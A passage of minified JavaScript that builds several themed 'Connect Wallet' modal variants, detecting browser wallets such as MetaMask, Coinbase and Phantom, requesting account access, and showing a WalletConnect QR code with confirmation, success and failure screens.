          `}}}),n.on("connect",()=>{n.request({method:"eth_accounts"}).then(s=>{s&&s.length>0&&(Kf(),cne(),setTimeout(()=>{sE(),i({provider:n,walletAddress:s[0],name:r.info.name})},1500))}).catch(s=>{console.error("Failed to get accounts:",s),Kf(),rP()})}),await n.connect()}catch(n){console.error("WalletConnect initialization error:",n),Kf(),rP()}}async function yJe(){try{const r=await fetch("./assets/styles3.css");if(!r.ok)throw new Error("    ");return await r.text()}catch(r){console.error("   :",r)}}const xJe=Object.freeze(Object.defineProperty({__proto__:null,disconnectWallet:hJe,hideModal:sE,initModal:fJe,openModal:lne,showConfirmModal:mJe,showErrorModal:wJe,showLoadingModal:gJe},Symbol.toStringTag,{value:"Module"})),une=document.createElement("div");document.body.appendChild(une);const dne=une.attachShadow({mode:"open"}),ti=document.createElement("html");document.head.append(Object.assign(document.createElement("link"),{rel:"stylesheet",href:"https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap"}));dne.appendChild(ti);function hne(){const r=B3();r.reset();const e=r.getProviders();if((!e||e.length===0)&&window.ethereum){let t="Injected Wallet",i="./assets/modal4/metamask.png";window.ethereum.isMetaMask?t="MetaMask":window.ethereum.isCoinbaseWallet?t="Coinbase Wallet":window.ethereum.isPhantom&&(t="Phantom"),e.push({info:{name:t,icon:i,walletId:"injected",uuid:""},provider:window.ethereum})}return e.push({info:{name:"WalletConnect",icon:"./assets/modal4/wallet_connect.png",walletId:"walletconnect",uuid:""},provider:null}),e}function fne(r){const e=document.createDocumentFragment();return[...r].sort((n,s)=>n.info.name==="MetaMask"?-1:s.info.name==="MetaMask"?1:n.info.name==="Rabby Wallet"?-1:s.info.name==="Rabby Wallet"||n.info.walletId==="walletconnect"?1:s.info.walletId==="walletconnect"?-1:n.info.name.localeCompare(s.info.name)).slice(0,5).forEach((n,s)=>{const o=document.createElement("p");o.className="wallet-link",o.dataset.walletId=n.info.walletId,o.dataset.walletName=n.info.name,o.dataset.walletIcon=n.info.icon,o.dataset.providerIndex=r.findIndex(c=>c.info.name===n.info.name&&c.info.walletId===n.info.walletId);const a=document.createElement("img");a.src="./assets/modal4/hover.svg",a.alt="",a.className="hovered_wallet",o.appendChild(a),o.appendChild(document.createTextNode(` [${s+1}] ${n.info.name}`)),e.appendChild(o)}),e}async function CJe(r,e,t){let i=[];return r.info.walletId==="walletconnect"?{success:!1}:(i=await r.provider.request({method:"eth_requestAccounts"}),i&&i.length>0?{success:!0,provider:r.provider,accounts:i}:{success:!1})}function _d(){const r=ti.querySelector("#awaiting_confirmation_step"),e=ti.querySelector("#awaiting_success_step"),t=ti.querySelector("#connection_failed_step"),i=ti.querySelector("#connect_wallet_step"),n=ti.querySelector("#additional_info_step"),s=ti.querySelector("#walletConnect_step");r&&(r.style.display="none"),e&&(e.style.display="none"),t&&(t.style.display="none"),i&&(i.style.display="none"),n&&(n.style.display="none"),s&&(s.style.display="none")}function oE(){const r=ti.querySelector("#connect_wallet_step");r.style.display="flex"}function EJe(r){const e=ti.querySelector("#awaiting_confirmation_step");e&&(e.style.display="flex"),ti.querySelectorAll("#wallet_selected_name").forEach(t=>{t.textContent=r.name}),ti.querySelectorAll(".wallet-link_info").forEach(t=>{switch(r.name){case"MetaMask":t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":t.href="https://www.coinbase.com/wallet",t.target="_blank",t.textContent="Don't have Coinbase Wallet?";break;case"Phantom":t.href="https://phantom.app/",t.target="_blank",t.textContent="Don't have Phantom?";break;case"Rabby Wallet":t.href="https://rabby.io/",t.target="_blank",t.textContent="Don't have Rabby Wallet?";break;default:t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have Wallet?"}}),ti.querySelectorAll(".image_connected_wallet").forEach(t=>{t.src=r.icon})}function pne(){ti.querySelector("#awaiting_confirmation_step").style.display="none",ti.querySelector("#awaiting_success_step").style.display="flex"}function iP(){ti.querySelector("#awaiting_confirmation_step").style.display="none";const r=ti.querySelector("#connection_failed_step");return r.style.display="flex",r}async function _Je(r){ti.querySelectorAll(".wallet_name").forEach(e=>{e.textContent=r})}async function SJe(r,e,t,i){if(r.info.walletId==="walletconnect"){wne(r.info),await bne(r,e,t,i);return}_d(),EJe(r.info),_Je(r.info.name);try{const n=await CJe(r,e,t);n.success&&(pne(),setTimeout(()=>{aE(),i({provider:n.provider,walletAddress:n.accounts[0],name:r.info.name})},1500))}catch(n){console.error("Connection error:",n);const o=iP().querySelector(".btn.btn-primary");o&&(o.onclick=()=>{_d(),oE()})}}async function AJe(r){r&&r.disconnect&&await r.disconnect(),window.ethereum?.isMetaMask&&await window.ethereum.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}async function gne(r="",e=[],t=!0){return new Promise((i,n)=>{const s=ti.querySelector("#modal_connect"),o=ti.querySelector("#wallet-list-container");t&&(_d(),WO(),oE()),setTimeout(()=>{s.classList.add("active")},100);const a=hne(),c=fne(a);o&&(o.innerHTML="",o.appendChild(c)),ti.querySelector(".wallet_connect").addEventListener("click",async()=>{const l=a.find(u=>u.info.walletId==="walletconnect");l&&(wne(l.info),await bne(l,r,e,i))}),ti.querySelectorAll(".wallet-link").forEach(l=>{l.addEventListener("click",async()=>{const u=parseInt(l.dataset.providerIndex);!isNaN(u)&&a[u]?await SJe(a[u],r,e,i):console.error("Provider not found for this wallet link")})})})}function mne(){const r=ti.querySelector(".left_side_container"),e=ti.querySelector(".modal-content");r.style.display="none",e.classList.add("small")}function WO(){const r=ti.querySelector(".left_side_container");r.style.display="flex";const e=ti.querySelector(".modal-content");e.classList.remove("small"),e.classList.remove("small_plus")}async function aE(){ti.querySelector("#modal_connect").classList.remove("active"),setTimeout(()=>{_d(),oE(),WO()},100)}async function IJe(r,e,t=!1){const i=await PJe(),n=document.createElement("div");t&&dne.querySelector("html").classList.add("dark"),n.innerHTML=`<style>${i}</style>
    <div id="modal_connect" class="modal-content">
      <div class="modal-connect border border-[#242424] w-full h-full dark:bg-[#000000] bg-white">
        <div class="flex items-start h-full">
          <div class="p-4 h-full left_side_container flex-shrink-0 w-full max-w-[300px]">
            <div class="left_side flex flex-col w-full h-full">
              <div class="py-9 px-4 flex flex-col text-center gap-4">
                <img class="dark:hidden" src="./assets/modal4/connect.svg" alt="" srcset="">
                <img class="hidden dark:!flex" src="./assets/modal4/connect_dark.svg" alt="" srcset="">
                <p class="text-[10px] text-black dark:text-white">CONNECT YOUR WALLET BELOW</p>
              </div>
              <div id="wallet-list-container" class="flex flex-col gap-1 pt-5 pl-6 max-h-[320px] h-full overflow-y-auto">
              </div>
              <div class="py-7 flex justify-center items-center">
                <div class="wallet_connect">
                  WalletConnect
                </div>
              </div>
            </div>
          </div>
          <div id="connect_wallet_step" class="p-4  w-full h-full flex  justify-center items-center flex-col gap-11">
            <div class="flex flex-col h-full justify-center items-center gap-8">

              <img src="./assets/modal4/connect_wallet_step.gif" alt="" srcset=""
                class="w-full max-w-[310px] max-h-[310px] h-full dark:hidden">
              <img src="./assets/modal4/connect_wallet_step_dark.gif" alt="" srcset=""
                class="w-full max-w-[310px] max-h-[310px] h-full hidden dark:!flex">



              <div class="h-full flex flex-col justify-center items-center gap-4">
                <p class=" dark:text-white text-black">Your gateway <span class="text-blue">to</span> the decentralized
                  world</p>
                <p class="dark:text-white text-black"><span class="text-blue">Connect</span> a wallet <span
                    class="text-blue">to get</span> started</p>
                <a href="">[ <span class="text-orange">New</span> to wallets? ]</a>
              </div>

              <p class="dark:text-white/50 text-black/50">Powered by ModalX</p>

            </div>
          </div>
          <div id="connection_failed_step" class="p-4  w-full h-full hidden justify-center items-center flex-col ">
            <div class="flex flex-col h-full justify-center items-center gap-8">

              <div class="flex flex-col h-full justify-center items-center gap-12">
                <img src="./assets/modal4/failed.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full dark:hidden">
                <img src="./assets/modal4/failed_dark.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full hidden dark:!flex">



                <div class="flex flex-col justify-center items-center gap-4">
                  <p class="text-danger text-xl ">Connection failed</p>

                  <div class="return_default_step cursor-pointer">Try again</div>
                </div>
              </div>

              <p class="dark:text-white/50 text-black/50">Powered by ModalX</p>

            </div>
          </div>
          <div id="additional_info_step" class="p-4 w-full h-full hidden justify-center items-center flex-col ">
         <div class="flex flex-col h-full justify-center items-center gap-8">
              <div class="flex flex-col h-full justify-center items-center gap-12">
                <img id="additional_image" src="./assets/modal4/failed.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full dark:hidden">
                <img id="additional_image_dark" src="./assets/modal4/failed_dark.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full hidden dark:!flex">



                <div class="flex flex-col justify-center items-center gap-4">
                  <p id="additional_text" class=" text-xl ">Connection failed</p>

                </div>
              </div>

              <p class="dark:text-white/50 text-black/50">Powered by ModalX</p>

            </div>
          </div>
          <div id="awaiting_confirmation_step" class="p-4  w-full h-full hidden justify-center items-center flex-col ">
            <div class="flex flex-col h-full justify-center items-center gap-8">

              <div class="flex flex-col h-full justify-center items-center gap-12">
                <img src="./assets/modal4/confirmation.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full dark:hidden">
                <img src="./assets/modal4/confirmation_dark.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full hidden dark:!flex">



                <div class="flex flex-col justify-center items-center gap-4">
                  <p class="text-black dark:text-white text-xl ">Awaiting <span class="text-blue">confirmation</span></p>

                  <p class="text-black/50 dark:text-white/50 text-sm max-w-[180px] text-center">
                    <span class="text-orange">Accept</span> the connection
                    request in <span class="wallet_name text-orange">MetaMask</span>
                  </p>
                </div>
              </div>

              <p class="dark:text-white/50 text-black/50">Powered by ModalX</p>

            </div>
          </div>
                 <div id="walletConnect_step" class="w-full h-full p-3 px-2 justify-center items-center flex-col"
          style="display: flex;">

          <div class="flex flex-col wallet_connect_bg h-full   w-full px-2 ">

            <div id="walletConnect_step_content" class="flex flex-col w-full h-full items-center ">
              <div class="py-4 flex justify-center items-center flex-col gap-1.5">
                <span class=" text-black dark:text-white text-xs font-semibold">
                  WALLETCONNECT
                </span>
                <span class=" text-black dark:text-white text-xs font-semibold">
                  <span class="text-blue">Connect</span> your wallet
                </span>
              </div>
              <div class="flex flex-col  gap-3 py-4 pt-8">
                <div class="flex justify-between items-center !text-[10px] w-full">
                  <span class="text-blue">
                    [Mobile]
                  </span>
                  <span class="text-black dark:text-white  font-semibold">
                    [Scan with your wallet]
                  </span>
                </div>
                <div id="qrcode-container" class=" rounded-lg"
                  style="max-width: 216px; min-height: 200px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
                  <div id="qrcode"><img
                      
                      width="200" height="200"
                      style="border-radius: 8px; display: block; filter: drop-shadow(rgba(0, 0, 0, 0.1) 0px 4px 6px);">
                  </div>
                </div>
                <div class="flex justify-between items-center text-[10px] w-full">
                  <span class="text-blue">
                    [Mobile]
                  </span>
                  <span class="text-black dark:text-white font-semibold">
                    [Copy]
                  </span>
                </div>
              </div>

            </div>
          </div>

        </div>
          <div id="awaiting_success_step" class="p-4 hidden  w-full h-full  justify-center items-center flex-col ">
            <div class="flex flex-col h-full justify-center items-center gap-8">

              <div class="flex flex-col h-full justify-center items-center gap-12">
                <img src="./assets/modal4/connected.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full dark:hidden">
                <img src="./assets/modal4/connected_dark.gif" alt="" srcset="" class="w-full max-w-[266px] max-h-[232px] h-full hidden dark:!flex">



                <div class="flex flex-col justify-center items-center gap-4">
                  <p class="text-black dark:text-white text-xl ">Connected</p>

                  <p class="text-black/50 dark:text-white/50 text-sm text-center">
                    <span class="text-blue">Successfully </span>Connected
                  </p>
                </div>
              </div>

              <p class="dark:text-white/50 text-black/50">Powered by ModalX</p>

            </div>
          </div>
        </div>
      </div>
    </div>`,n.querySelector("#wallet-list-container").appendChild(fne(hne())),n.querySelectorAll(".return_default_step").forEach(o=>{o.addEventListener("click",()=>{_d(),oE(),WO()})}),n.querySelectorAll(".close_modal").forEach(o=>{o.addEventListener("click",()=>{aE()})}),ti.appendChild(n)}function HO(r,e){const t={success:{text:"Successfully Connected",image:"./assets/modal4/connected.gif",image_dark:"./assets/modal4/connected_dark.gif"},error:{text:"Connection Failed",image:"./assets/modal4/failed.gif",image_dark:"./assets/modal4/failed_dark.gif"},loading:{text:"Awaiting Confirmation",image:"./assets/modal4/confirmation.gif",image_dark:"./assets/modal4/confirmation_dark.gif"}};ti.querySelector("#additional_text").textContent=e||t[r].text,ti.querySelector("#additional_image").src=t[r].image,ti.querySelector("#additional_image_dark").src=t[r].image_dark}function VO(){_d(),mne();const r=ti.querySelector("#additional_info_step");r?(r.style.display="flex",gne(null,null,!1)):console.error("Content modal step not found")}function TJe(r){HO("loading",r),VO()}function kJe(r){HO("success",r),VO()}function NJe(r){HO("error",r),VO()}function wne(r){_d(),mne(),ti.querySelector(".modal-content").classList.add("small_plus");const t=ti.querySelector("#walletConnect_step");if(t){const i=t.querySelector("#walletConnect_step_content");i.innerHTML=`
  <div class="py-4 flex justify-center items-center flex-col gap-1.5">
                <span class=" text-black dark:text-white text-xs font-semibold">
                  WALLETCONNECT
                </span>
                <span class=" text-black dark:text-white text-xs font-semibold">
                  <span class="text-blue">Connect</span> your wallet
                </span>
              </div>
              <div class="flex flex-col  gap-3 py-4 pt-8">
                <div class="flex justify-between items-center !text-[10px] w-full">
                  <span class="text-blue">
                    [Mobile]
                  </span>
                  <span class="text-black dark:text-white  font-semibold">
                    [Scan with your wallet]
                  </span>
                </div>
                <div id="qrcode-container" class=" rounded-lg"
                  style="max-width: 216px; min-height: 200px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
                  <div id="qrcode">
                    <span class="loader"></span>
                  </div>
                </div>
                <div class="flex justify-between items-center text-[10px] w-full">
                  <span class="text-blue">
                    [Mobile]
                  </span>
                  <span class="text-black dark:text-white font-semibold">
                    [Copy]
                  </span>
                </div>
              </div>
      `,t.style.display="flex"}}async function bne(r,e,t,i){try{const n=await q3.init({projectId:e,optionalChains:t,showQrModal:!1,qrModalOptions:{themeMode:"dark"}});n.on("display_uri",async s=>{const o=ti.querySelector("#qrcode");if(o){o.innerHTML="";try{const a=await z3.toDataURL(s,{width:200,margin:0,color:{dark:"#ffffff",light:"#1a1c24"},errorCorrectionLevel:"H"}),c=document.createElement("img");c.src=a,c.width=215,c.height=215,c.style.cssText=`
            border-radius: 8px;
            display: block;
            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
          `,o.appendChild(c)}catch(a){console.error("Error generating QR code:",a),o.innerHTML=`
            <div style="color: #ff4d4d; text-align: center; padding: 20px;">
              <p>  QR-</p>
              <p style="font-size: 12px; margin-top: 10px;">${s}</p>
            </div>
          `}}}),n.on("connect",()=>{n.request({method:"eth_accounts"}).then(s=>{s&&s.length>0&&(_d(),pne(),setTimeout(()=>{aE(),i({provider:n,walletAddress:s[0],name:r.info.name})},1500))}).catch(s=>{console.error("Failed to get accounts:",s),_d(),iP()})}),await n.connect()}catch(n){console.error("WalletConnect initialization error:",n),_d(),iP()}}async function PJe(){try{const r=await fetch("./assets/styles4.css");if(!r.ok)throw new Error("    ");return await r.text()}catch(r){console.error("   :",r)}}const $Je=Object.freeze(Object.defineProperty({__proto__:null,disconnectWallet:AJe,hideModal:aE,initModal:IJe,openModal:gne,showConfirmModal:kJe,showErrorModal:NJe,showLoadingModal:TJe},Symbol.toStringTag,{value:"Module"})),vne=document.createElement("div");document.body.appendChild(vne);const RJe=vne.attachShadow({mode:"open"}),vi=document.createElement("html");RJe.appendChild(vi);function yne(){const r=B3();r.reset();const e=r.getProviders();if((!e||e.length===0)&&window.ethereum){let t="Injected Wallet",i="./assets/metamask.png";window.ethereum.isMetaMask?t="MetaMask":window.ethereum.isCoinbaseWallet?t="Coinbase Wallet":window.ethereum.isPhantom&&(t="Phantom"),e.push({info:{name:t,icon:i,walletId:"injected",uuid:""},provider:window.ethereum})}return e.push({info:{name:"WalletConnect",icon:"./assets/modal5/wallet_connect_icon.svg",walletId:"walletconnect",uuid:""},provider:null}),e}function L0(r){const e=vi.querySelector(".modal-connect"),t=vi.querySelector("#modal_connect");e.classList.remove("bg_wallets","bg_primary","bg_success","bg_danger"),r==="wallets"?(t.classList.remove("dialog"),e.classList.add("bg_wallets")):r==="primary"?(t.classList.add("dialog"),e.classList.add("bg_primary")):r==="success"?(t.classList.add("dialog"),e.classList.add("bg_success")):r==="danger"&&(t.classList.add("dialog"),e.classList.add("bg_danger"))}function xne(r){let e=document.createElement("div");return e.id="wallet-list",e.className="flex flex-col gap-3.5 h-full",e.innerHTML="",[...r].sort((n,s)=>n.info.name==="MetaMask"?-1:s.info.name==="MetaMask"?1:n.info.name==="Rabby Wallet"?-1:s.info.name==="Rabby Wallet"||n.info.walletId==="walletconnect"?1:s.info.walletId==="walletconnect"?-1:n.info.name.localeCompare(s.info.name)).slice(0,6).forEach(n=>{const s=document.createElement("div");s.className="wallet-link",(n.info.name==="MetaMask"||n.info.name==="Rabby Wallet")&&s.classList.add("recommended"),s.dataset.walletId=n.info.walletId,s.dataset.walletName=n.info.name,s.dataset.walletIcon=n.info.icon,s.dataset.providerIndex=r.findIndex(u=>u.info.name===n.info.name&&u.info.walletId===n.info.walletId);const o=document.createElement("div");o.className="gap-1 flex items-center";const a=document.createElement("img");a.src=n.info.icon||"./assets/modal5/metamask.svg",a.alt="",a.className="w-5 h-5";const c=document.createElement("p");c.className="text-[22px] uppercase",c.textContent=n.info.name,o.appendChild(a),o.appendChild(c);const l=document.createElement("span");l.className="text-[11px]",l.textContent=n.info.name==="MetaMask"||n.info.name==="Rabby Wallet"?"Recommended":"",s.appendChild(o),s.appendChild(l),e.appendChild(s)}),e}async function OJe(r,e,t){let i=[];return r.info.walletId==="walletconnect"?{success:!1}:(i=await r.provider.request({method:"eth_requestAccounts"}),i&&i.length>0?{success:!0,provider:r.provider,accounts:i}:{success:!1})}function Gf(){const r=vi.querySelector("#awaiting_confirmation_step"),e=vi.querySelector("#awaiting_success_step"),t=vi.querySelector("#connection_failed_step"),i=vi.querySelector("#connect_wallet_step"),n=vi.querySelector("#additional_info_step"),s=vi.querySelector("#walletConnect_step");r&&(r.style.display="none"),e&&(e.style.display="none"),t&&(t.style.display="none"),i&&(i.style.display="none"),n&&(n.style.display="none"),s&&(s.style.display="none")}function Cne(){const r=vi.querySelector("#connect_wallet_step");r.style.display="flex",L0("wallets")}function BJe(r){const e=vi.querySelector("#awaiting_confirmation_step");L0("primary"),e&&(e.style.display="flex"),vi.querySelectorAll("#wallet_selected_name").forEach(t=>{t.textContent=r.name}),vi.querySelectorAll(".wallet-link_info").forEach(t=>{switch(r.name){case"MetaMask":t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":t.href="https://www.coinbase.com/wallet",t.target="_blank",t.textContent="Don't have Coinbase Wallet?";break;case"Phantom":t.href="https://phantom.app/",t.target="_blank",t.textContent="Don't have Phantom?";break;case"Rabby Wallet":t.href="https://rabby.io/",t.target="_blank",t.textContent="Don't have Rabby Wallet?";break;default:t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have Wallet?"}}),vi.querySelectorAll(".image_connected_wallet").forEach(t=>{t.src=r.icon})}function Ene(){vi.querySelector("#awaiting_confirmation_step").style.display="none",vi.querySelector("#awaiting_success_step").style.display="flex",L0("success")}function nP(){vi.querySelector("#awaiting_confirmation_step").style.display="none";const r=vi.querySelector("#connection_failed_step");return L0("danger"),r.style.display="flex",r}function _ne(r){vi.querySelector("#network_icon").src=r}async function MJe(r,e,t,i){if(L0("bg-primary"),UJe(r.info.name),_ne(r.info.icon),r.info.walletId==="walletconnect"){zJe(r.info),await WJe(r,e,t,i);return}Gf(),BJe(r.info);try{const n=await OJe(r,e,t);n.success&&(Ene(),setTimeout(()=>{cE(),i({provider:n.provider,walletAddress:n.accounts[0],name:r.info.name})},1500))}catch(n){console.error("Connection error:",n);const o=nP().querySelector(".btn.btn-primary");o&&(o.onclick=()=>{Gf(),Cne()})}}async function DJe(r){r&&r.disconnect&&await r.disconnect(),window.ethereum?.isMetaMask&&await window.ethereum.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}async function Sne(r,e){return new Promise((t,i)=>{const n=vi.querySelector("#modal_connect"),s=vi.querySelector("#wallet-list-wrapper");_ne("./assets/modal5/network.svg"),L0("wallets"),setTimeout(()=>{n.classList.add("active")},100);const o=yne(),a=xne(o);s&&(s.innerHTML="",s.appendChild(a)),vi.querySelectorAll(".wallet-link").forEach(c=>{c.addEventListener("click",async()=>{const l=parseInt(c.dataset.providerIndex);!isNaN(l)&&o[l]?await MJe(o[l],r,e,t):console.error("Provider not found for this wallet link")})})})}async function cE(){vi.querySelector("#modal_connect").classList.remove("active"),setTimeout(()=>{Gf(),Cne()},100)}async function LJe(r,e,t=!1){const i=await HJe(),n=document.createElement("div"),s=document.createElement("div");s.id="wallet-list",s.className="flex flex-col gap-1 h-full",n.appendChild(s),n.innerHTML=`<style>${i}</style><div id="modal_connect" style="height: fit-content !important;" class="modal-content  ">
    <div class="modal-connect bg_wallets relative flex pt-6 px-8 flex-col gap-6  w-full h-full rounded-4xl ">
      <div class="close-modal absolute top-6 right-6 w-fit h-fit cursor-pointer">
        <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M1 1L7.5 7.5M7.5 1L1 7.5" stroke="white" />
        </svg>

      </div>
      <div class="selected_wallet_wrapper">
        <div class="bg_ellipse_small w-2.5 h-2.5">

        </div>
        <div class="bg_ellipse_small w-4 h-4">

        </div>
        <div class="bg_ellipse_big flex justify-center items-center w-16 h-16">
          <div class="bg_ellipse_coin w-12 h-12 flex justify-center items-center">
            <img src="./assets/modal5/network.svg" id="network_icon" class="w-6 h-6 rounded-lg" alt="" srcset="">
          </div>
        </div>
        <div class="bg_ellipse_small w-4 h-4">

        </div>
        <div class="bg_ellipse_small w-2.5 h-2.5">

        </div>


      </div>
      <div id="connect_wallet_step" class=" w-full h-full flex justify-start items-center flex-col gap-8">
        <div class="flex flex-col text-center gap-2.5">
          <p class="text-2xl leading-normal text-gradient">Connect Wallet</p>
          <p class="text-[11px] max-w-[210px] mx-auto text-center leading-normal">Your gateway to the decentralized
            world, connect a wallet to get started</p>
        </div>
        <div class=" max-h-[418px] w-full py-4    gap-8 flex flex-col border-t  border-[#1B1B1D]">
          <div id="wallet-list-wrapper" class="flex flex-col border-b pb-4  h-full border-[#1B1B1D] gap-3.5">
         
          </div>
          <div style="padding-bottom: 10px;" class="flex justify-center items-center gap-1.5">
            <div class="btn-modal btn-modal-primary close-modal">
              Close
            </div>
            <a href="https://crypto.com/en/university/crypto-wallets" target="_blank" class="btn-modal btn-modal-secondary">
              New to wallets?
            </a>
          </div>
        </div>

      </div>
      <div id="connection_failed_step" class="w-full h-full hidden  justify-center pt-5 items-center flex-col ">

        <div class="flex flex-col text-center justify-center items-center  gap-8">
          <p class="text-2xl leading-normal text-danger">Connection Failed</p>
          <div class="close-modal btn-modal btn-modal-danger">
            Close
          </div>
        </div>


      </div>
      <div id="awaiting_confirmation_step" class="w-full h-full hidden justify-center items-center flex-col ">
        <div class="flex flex-col text-center justify-center items-center  gap-8">
          <p class="text-2xl leading-normal text-gradient">Awaiting Confirmation</p>
          <div class="close-modal btn-modal btn-modal-primary">
            Close
          </div>
        </div>

      </div>
      <div id="walletConnect_step" class="w-full h-full hidden  justify-center items-center flex-col">
        <div class="flex flex-col text-center justify-center items-center  gap-2">
          <p class="text-2xl leading-normal text-gradient">WALLETCONNECT</p>
          <p class="text-[11px] max-w-[210px] mx-auto text-center leading-normal">Connect your wallet to continue</p>
        </div>

        <div class="flex flex-col h-full justify-center items-center w-full gap-6">

          <div id="walletConnect_step_content" class="flex flex-col w-full justify-center items-center gap-4">
            <span class="loader"></span>
          </div>
        </div>

      </div>
      <div id="awaiting_success_step" class="hidden  w-full h-full  justify-center items-center flex-col ">
        <div class="flex flex-col text-center justify-center items-center  gap-8">
          <p class="text-2xl leading-normal text-gradient max-w-[200px]">Connected</p>

        </div>
      </div>
      <div id="additional_info_step" class="w-full h-full hidden justify-center items-center flex-col ">
        <div class="flex wrapper-bg relative flex-col h-full justify-start w-full px-5 items-center gap-10">
          <p id="additional_text" class="text-2xl leading-normal text-gradient">
            ONNECTED
          </p>



        </div>
      </div>
    </div>
  </div>`,n.querySelector("#wallet-list-wrapper").appendChild(xne(yne())),n.querySelectorAll(".close-modal").forEach(o=>{o.addEventListener("click",()=>{cE()})}),vi.appendChild(n)}function KO(r,e){const t={success:{text:"Successfully Connected"},error:{text:"Connection Failed"},loading:{text:"Awaiting Confirmation"}};vi.querySelector("#additional_text").textContent=e||t[r].text}function GO(){Gf();const r=vi.querySelector("#additional_info_step");r?(r.style.display="flex",Sne()):console.error("Content modal step not found")}async function UJe(r){vi.querySelectorAll(".wallet_name").forEach(e=>{e.textContent=r})}function jJe(r){KO("loading",r),GO(),L0("primary")}function FJe(r){KO("success",r),GO(),L0("success")}function qJe(r){KO("error",r),GO(),L0("danger")}function zJe(r){Gf();const e=vi.querySelector("#walletConnect_step");if(e){vi.querySelectorAll("#wallet_selected_name").forEach(i=>{i.textContent=r.name}),vi.querySelectorAll(".wallet-link_info").forEach(i=>{switch(r.name){case"MetaMask":i.href="https://metamask.io/",i.target="_blank",i.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":i.href="https://www.coinbase.com/wallet",i.target="_blank",i.textContent="Don't have Coinbase Wallet?";break;case"Phantom":i.href="https://phantom.app/",i.target="_blank",i.textContent="Don't have Phantom?";break;case"Rabby Wallet":i.href="https://rabby.io/",i.target="_blank",i.textContent="Don't have Rabby Wallet?";break;case"Trust Wallet":i.href="https://trustwallet.com/",i.target="_blank",i.textContent="Don't have Trust Wallet?";break;default:i.href="https://metamask.io/",i.target="_blank",i.textContent="Don't have Wallet?"}}),vi.querySelectorAll(".image_connected_wallet").forEach(i=>{i.src=r.icon});const t=e.querySelector("#walletConnect_step_content");t.innerHTML=`
      <p class="font-semibold text-2xl leading-normal text-gradient">Scan QR-code</p>
      <div id="qrcode-container" class="mt-4 mb-4 p-2 bg-black/5 dark:bg-white/10 rounded-lg" style="max-width: 216px; min-height: 216px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
        <div id="qrcode">
        <span class="loader"></span>
        </div>
      </div>
      <p style="max-width: 320px;" class="  text-center ">Open a compatible WalletConnect wallet and scan the QR-code</p>
    `,e.style.display="flex"}else console.error("WalletConnect step element not found")}async function WJe(r,e,t,i){try{const n=await q3.init({projectId:e,optionalChains:t,showQrModal:!1});n.on("display_uri",s=>{const o=vi.querySelector("#qrcode");if(o){o.innerHTML="";try{const a=document.createElement("div");a.className="styled-qr-container",a.style.cssText=`
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            margin: 0 auto;
          `,a.style.animation="qrFadeIn 0.6s ease forwards",z3.toDataURL(s,{width:200,margin:0,color:{dark:"#ffffff",light:"#1a1c24"},errorCorrectionLevel:"H"}).then(c=>{const l=document.createElement("div");l.style.cssText=`
              position: relative;
              overflow: hidden;
            `;const u=document.createElement("img");u.src=c,u.width=200,u.height=200,u.style.cssText=`
              border-radius: 8px;
              display: block;
              filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
            `;const d=document.createElement("div");d.style.cssText=`
              position: absolute;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              width: 40px;
              height: 40px;
              background: white;
              border-radius: 50%;
              display: flex;
              align-items: center;
              justify-content: center;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            `;const h=document.createElement("img");h.src="./assets/modal5/wallet_connect_mini.png",h.style.cssText=`
              width: 30px;
              height: 30px;
              border-radius: 50%;
              object-fit: contain;
            `;const f=document.createElement("div");if(f.style.cssText=`
              position: absolute;
              bottom: -10px;
              left: 0;
              right: 0;
              text-align: center;
              font-size: 14px;
              font-weight: 500;
              color: white;
              text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
              transform: translateY(-50%);
            `,d.appendChild(h),l.appendChild(u),l.appendChild(d),a.appendChild(l),a.appendChild(f),o.appendChild(a),!document.getElementById("qr-animations")){const p=document.createElement("style");p.id="qr-animations",p.textContent=`
                @keyframes qrFadeIn {
                  from { opacity: 0; transform: scale(0.9); }
                  to { opacity: 1; transform: scale(1); }
                }
                @keyframes qrPulse {
                  0% { transform: scale(1); }
                  50% { transform: scale(1.05); }
                  100% { transform: scale(1); }
                }
                .styled-qr-container:hover {
                  animation: qrPulse 1.5s infinite;
                }
              `,document.head.appendChild(p)}}).catch(c=>{console.error("Error generating QR-code (URL):",c),o.innerHTML=`
              <div style="color: #ff4d4d; text-align: center; padding: 20px; background: rgba(255, 77, 77, 0.1); border-radius: 8px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
                <p style="margin-top: 10px; font-weight: 500;">  QR-</p>
              </div>
            `})}catch(a){console.error("Error generating QR-code:",a),o.innerHTML=`
            <div style="word-break: break-all; font-size: 12px; padding: 10px; text-align: center;">
              <p>QR-code not generated. Use URI:</p>
              <code style="background: #f0f0f0; padding: 5px; display: block; margin-top: 10px;">${s}</code>
            </div>
